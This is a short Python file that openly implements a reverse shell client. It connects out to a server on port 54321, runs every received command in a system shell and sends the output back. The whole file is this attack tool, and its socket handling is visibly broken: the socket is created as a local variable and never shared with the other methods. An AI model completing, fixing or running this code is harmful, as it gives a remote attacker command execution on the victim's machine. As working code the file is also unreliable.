import socket
import subprocess
import json

class Reverse_Shell:
    global sock
    global command

    # declaration of the socket
    # see documentation

    def reliable_send(self, data):
        json_data = json.dumps(data)
        sock.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + sock.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def connection(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # connection to the server
        ipaddress = ""
        sock.connect((ipaddress, 54321))
        print("Connection established to the server")

    def execute_command(self):
        while True:
            command = self.reliable_receive()
            if command == "q":
                break
            else:
                # creation of the command, see documentation
                proc = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                result = proc.stdout.read() + proc.stderr.read()
                self.reliable_send(result)

    def end_connection(self):
        # close the socket
        sock.close()

    def main(self):
        self.connection()
        self.execute_command()
        if command == "q":
            self.end_connection()
